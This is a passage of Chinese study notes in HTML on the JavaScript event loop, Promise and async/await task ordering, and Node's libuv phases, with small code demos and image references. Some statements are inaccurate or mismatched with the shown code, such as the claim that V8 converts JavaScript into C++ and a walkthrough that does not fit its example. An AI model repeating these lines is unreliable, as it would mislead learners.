data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Promise与 Event Loop</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [5].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [6].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [7].gif" type="image/gif" data-filename="3.gif" width="880"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [8].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [9].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [10].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Async/Await 与 Event Loop</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [11].gif" type="image/gif" data-filename="3.gif" width="880"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [12].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [13].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [14].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [15].gif" type="image/gif" data-filename="3.gif" width="720"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(_ =&gt; console.log(4))</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">new Promise(resolve =&gt; {</font></div><div><font style="font-size: 12pt;">  resolve()</font></div><div><font style="font-size: 12pt;">  console.log(1)</font></div><div><font style="font-size: 12pt;">}).then(_ =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log(3)</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">console.log(2)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">// 打印结果顺序为：1、2、3、4</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Promise的 then 方法，被认为是在 Microtask 微任务队列当中的：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [37].jpg" type="image/jpeg" data-filename="3.jpg" width="628"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">注意：new Promise 中的 console.log(3) 是同步执行的，</span><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">同步任务执行完后会去清空微任务队列，最后清空宏任务队列。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [38].jpg" type="image/jpeg" data-filename="3.jpg" width="682"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">上面的执行过程是：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1，将setTimeout 给 push 进宏任务</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2，将 then(2) push 进微任务</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">3，将 then(4) push 进微任务</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">4，任务队列为空，取出微任务第一个 then(2) 压入执行栈</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">5，输出2，将 then(3) push 进微任务</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">6，任务队列为空，取出微任务第一个 then(4) 压入执行栈</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">7，输出4</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">8，任务队列为空，取出微任务第一个 then(3) 压入执行栈</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">9，输出3</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">10，任务队列为空，微任务也为空，取出宏任务中的 setTimeout（1）</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">11，输出1</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">console.log('script start');</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(function() {</font></div><div><font style="font-size: 12pt;">  console.log('setTimeout');</font></div><div><font style="font-size: 12pt;">}, 0);</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">Promise.resolve().then(function() {</font></div><div><font style="font-size: 12pt;">  console.log('promise1');</font></div><div><font style="font-size: 12pt;">}).then(function() {</font></div><div><font style="font-size: 12pt;">  console.log('promise2');</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">console.log('script end');</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [16].gif" type="image/gif" data-filename="3.gif" width="611"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">为什么 then 是微任务</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这和每个浏览器有关，每个浏览器实现的 promise 不同，有的 then 是宏任务，有的是微任务，chrome 是微任务，普遍都默认为微任务</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div style="font-size: 12pt;">console.log('script start')</div><div style="font-size: 12pt;"><br/></div><div><font style="font-size: 12pt;">async function async1() {</font></div><div><font style="font-size: 12pt;">  await async2()</font></div><div><font style="font-size: 12pt;">  console.log('async1 end')</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">async function async2() {</font></div><div><font style="font-size: 12pt;">  console.log('async2 end')</font></div><div><font style="font-size: 12pt;">}</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">async1()</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">setTimeout(function() {</font></div><div><font style="font-size: 12pt;">  console.log('setTimeout')</font></div><div><font style="font-size: 12pt;">}, 0)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">new Promise(resolve =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log('Promise')</font></div><div><font style="font-size: 12pt;">  resolve()</font></div><div><font style="font-size: 12pt;">})</font></div><div><font style="font-size: 12pt;">  .then(function() {</font></div><div><font style="font-size: 12pt;">    console.log('promise1')</font></div><div><font style="font-size: 12pt;">  })</font></div><div><font style="font-size: 12pt;">  .then(function() {</font></div><div><font style="font-size: 12pt;">    console.log('promise2')</font></div><div><font style="font-size: 12pt;">  })</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">console.log('script end')</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">同步任务：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">console.log('script start') --&gt; </span><span style="font-size: 12pt;">async1()挂起 </span><span style="font-size: 12pt;">--&gt; </span><span style="font-size: 12pt;">await async2() </span><span style="font-size: 12pt;">--&gt; </span><span style="font-size: 12pt;">console.log('async2 end') --&gt; </span><span style="font-size: 12pt;">console.log('Promise') --&gt; </span><span style="font-size: 12pt;">console.log('script end')</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">微任务：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">console.log('async1 end') --&gt; </span><span style="font-size: 12pt;">console.log('promise1') --&gt; </span><span style="font-size: 12pt;">console.log('promise2')</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">宏任务：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">console.log('setTimeout')</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [39].jpg" type="image/jpeg" data-filename="3.jpg" width="1237"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Node 的 Event Loop</span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/5ec64b4c0001171408600626.jpg" type="image/jpeg" data-filename="5ec64b4c0001171408600626.jpg" width="860"/></span></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt;"><br/></span></span></div><div><span style="font-size: 12pt;">Node 整体上由三部分组成：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">● 应用层：这一层就是大家最熟悉的 Node.js 代码，包括 Node 应用以及一些标准库。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 桥接层：Node 底层是用 C++ 来实现的。桥接层负责封装底层依赖的 C++ 模块的能力，将其简化为 API 向应用层提供服务。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 底层依赖：这里就是最最底层的 C++ 库了，支撑 Node 运行的最基本能力在此汇聚。其中需要特别引起大家注意的就是 V8 和 libuv：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> V8 是 JS 的运行引擎，它负责把 JavaScript 代码转换成 C++，然后去跑这层 C++ 代码。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> libuv：它对跨平台的异步 I/O 能力进行封装，同时也是我们本节的主角：Node 中的事件循环就是由 libuv 来初始化的。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">注意哈：这里第一个区别来了——浏览器的 Event-Loop 由各个浏览器自己实现；而 Node 的 Event-Loop 由 libuv 来实现。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_131408.jpg" type="image/jpeg" data-filename="2021-12-05_131408.jpg" width="713"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_131447.jpg" type="image/jpeg" data-filename="2021-12-05_131447.jpg" width="1051"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt; color: unset; font-family: unset; font-weight: bold;">libuv 中的 Event-Loop 实现</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_131331.jpg" type="image/jpeg" data-filename="2021-12-05_131331.jpg" width="1194"/></span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">Node 中的 Event Loop 是基于 libuv 实现的，而 libuv 是 Node 的新跨平台抽象层，libuv 使用异步，事件驱动的编程方式，核心是提供 i/o 的事件循环和异步回调。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">libuv 的 API 包含有时间，非阻塞的网络，异步文件操作，子进程等等。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/3 [40].jpg" type="image/jpeg" data-filename="3.jpg" width="951"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">libuv 主导循环机制共有六个循环阶段。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">它们会按照顺序反复运行。每当进入某一个阶段的时候，都会从对应的回调队列中取出函数去执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">当队列为空或者执行的回调函数数量到达系统设定的阈值，就会进入下一阶段。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/5ec64bbf0001476c15300928.jpg" type="image/jpeg" data-filename="5ec64bbf0001476c15300928.jpg" width="1530"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_131520.jpg" type="image/jpeg" data-filename="2021-12-05_131520.jpg" width="991"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-12-05_131644.jpg" type="image/jpeg" data-filename="2021-12-05_131644.jpg" width="1159"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这六个阶段各是处理什么任务的：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> timers：执行 setTimeout 和 setInterval 中定义的回调；</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> pending callbacks：直译过来是“被挂起的回调”，</span><span style="font-size: 12pt;">处理一些上一轮循环中的少数未执行的 I/O 回调，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">如果网络 I/O 或者文件 I/O 的过程中出现了错误，就会在这个阶段处理错误的回调（比较少见，可以略过）；</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> idle, prepare：仅系统内部使用。这个阶段我们开发者不需要操心。（可以略过）；</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> poll （轮询阶段）：重点阶段，这个阶段会执行 I/O 回调，同时还会检查定时器是否到期；</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">这一阶段中，系统会做两件事情：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">1. 回到 timer 阶段执行回调</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">2. 执行 I/O 回调</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">并且在进入该阶段时如果没有设定 timer 的话，会发生以下两件事情：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 如果 poll 队列不为空，会遍历回调队列并同步执行，直到队列为空或者达到系统限制</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 如果 poll 队列为空时，会有两件事发生</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 如果有 setImmediate 回调需要执行，poll 阶段会停止并且进入到 check 阶段执行回调</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">   </span> <span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 如果没有 setImmediate 回调需要执行，会等待回调被加入到队列中并立即执行回调，这里同样会有个超时时间设置防止一直等待下去</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">当然设定了 timer 的话且 poll 队列为空，则会判断是否有 timer 超时，如果有的话会回到 timer 阶段执行回调。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> check（检查阶段）：处理 setImmediate 中定义的回调；</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> close callbacks：处理一些“关闭”的回调，比如 socket.on('close', ...) 就会在这个阶段被触发。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">宏任务与微任务</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">和浏览器中一样，Node 世界里也有宏任务与微任务之分：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">常见的 macro-task 比如： setTimeout、setInterval、 setImmediate、 script（整体代码）、I/O 操作等。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">常见的 micro-task 比如: process.nextTick、Promise、MutationObserver 等</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">需要注意的是，setImmediate 和 process.nextTick 是 Node 独有的</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">Node 中的事件循环流程</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">整个循环的流程：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">1. 执行全局的 Script 代码（与浏览器无差）；</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">2. 把微任务队列清空：注意，Node 清空微任务队列的手法比较特别。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">在浏览器中，我们只有一个微任务队列需要接受处理；</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">但在 Node 中，有两类微任务队列：next-tick 队列和其它队列。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">其中这个 next-tick 队列，专门用来收敛 process.nextTick 派发的异步任务。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">在清空队列时，优先清空 next-tick 队列中的任务，随后才会清空其它微任务；</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">3. 开始执行 macro-task（宏任务）。</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">注意，Node 执行宏任务的方式与浏览器不同：</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">在浏览器中，我们每次出队并执行一个宏任务；</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">而在 Node 中，我们每次会尝试清空当前阶段对应宏任务队列里的所有任务（除非达到了系统限制）；</span></span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">4. 步骤 3 开始，会进入 3 -&gt; 2 -&gt; 3 -&gt; 2…的循环</span>（整体过程如下所示）:</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">micro-task-queue ----&gt; timers-queue </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">micro-task-queue ----&gt; pending-queue </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">micro-task-queue ----&gt; polling-queue </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">micro-task-queue ----&gt; check-queue </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">micro-task-queue ----&gt; close-queue </font></div><div><font style="font-size: 12pt;">                            | </font></div><div><font style="font-size: 12pt;">                            |</font></div><div><font style="font-size: 12pt;">micro-task-queue ----&gt; timers-queue ......</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">整体来看，Node 中每次执行异步任务都是以批量的形式，“一队一队”地执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">循环形式为：宏任务队列 -&gt; 微任务队列 -&gt; 宏任务队列 —&gt; 微任务队列… 这样交替进行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">Node 中，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">有些情况下，</span><span style="font-size: 12pt;">定时器的执行顺序其实是随机的：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(() =&gt; { console.log('setTimeout') }, 0) </font></div><div><font style="font-size: 12pt;">setImmediate(() =&gt; { console.log('setImmediate') })</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">对于以上代码来说，setTimeout 可能执行在前，也可能执行在后</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 首先 setTimeout(fn, 0) === setTimeout(fn, 1)，这是由源码决定的</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 进入事件循环也是需要成本的，如果在准备时候花费了大于 1ms 的时间，那么在 timer 阶段就会直接执行 setTimeout 回调</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">●</span><span style="font-size: 12pt;"> 那么如果准备时间花费小于 1ms，那么就是 setImmediate 回调先执行了</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">在某些情况下，它们的执行顺序一定是固定的，比如以下代码：</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">const fs = require('fs') </font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">fs.readFile(__filename, () =&gt; { </font></div><div><font style="font-size: 12pt;">  setTimeout(() =&gt; { </font></div><div><font style="font-size: 12pt;">    console.log('timeout'); </font></div><div><font style="font-size: 12pt;">  }, 0) </font></div><div><font style="font-size: 12pt;">  setImmediate(() =&gt; { </font></div><div><font style="font-size: 12pt;">    console.log('immediate') </font></div><div><font style="font-size: 12pt;">  }) </font></div><div><font style="font-size: 12pt;">})</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">上述代码中，setImmediate 永远先执行。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">因为两个代码写在 IO 回调中，IO 回调是在 poll 阶段执行，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">当回调执行完毕后队列为空，发现存在 setImmediate 回调，所以就直接跳转到 check 阶段去执行回调了。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">上面介绍的都是 macrotask 的执行情况，</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">对于 microtask 来说，它会在以上每个阶段完成前清空 microtask 队列，下图中的 Tick 就代表了 microtask</span></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;"><img src="8 - EventLoop 、AJAX、异步编程_files/2021-11-09_151159.jpg" type="image/jpeg" data-filename="2021-11-09_151159.jpg" width="299"/></span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">setTimeout(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log('timer21')</font></div><div><font style="font-size: 12pt;">}, 0)</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">Promise.resolve().then(function() {</font></div><div><font style="font-size: 12pt;">  console.log('promise1')</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">对于以上代码来说，其实和浏览器中的输出是一样的，在异步的情况下，microtask 永远执行在 macrotask 前面。</span></div><div><span style="font-size: 12pt;"><br/></span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">Promise.resolve().then(function() {</font></div><div><font style="font-size: 12pt;">  console.log(&quot;promise1&quot;)</font></div><div><font style="font-size: 12pt;">}).then(function() {</font></div><div><font style="font-size: 12pt;">  console.log(&quot;promise2&quot;)</font></div><div><font style="font-size: 12pt;">});</font></div><div><font style="font-size: 12pt;"><br/></font></div><div><font style="font-size: 12pt;">process.nextTick(() =&gt; {</font></div><div><font style="font-size: 12pt;">  console.log('nextTick1')</font></div><div><font style="font-size: 12pt;">  process.nextTick(() =&gt; {</font></div><div><font style="font-size: 12pt;">    console.log('nextTick2')</font></div><div><font style="font-size: 12pt;">    process.nextTick(() =&gt; {</font></div><div><font style="font-size: 12pt;">      console.log('nextTick3')</font></div><div><font style="font-size: 12pt;">      process.nextTick(() =&gt; {</font></div><div><font style="font-size: 12pt;">        console.log('nextTick4')</font></div><div><font style="font-size: 12pt;">      })</font></div><div><font style="font-size: 12pt;">    })</font></div><div><font style="font-size: 12pt;">  })</font></div><div><font style="font-size: 12pt;">})</font></div></div><div><span style="font-size: 12pt;"><br/></span></div><div><span style="font-size: 12pt;">问：上述代码的输出结果是多少？</span></div><div><span style="font-size: 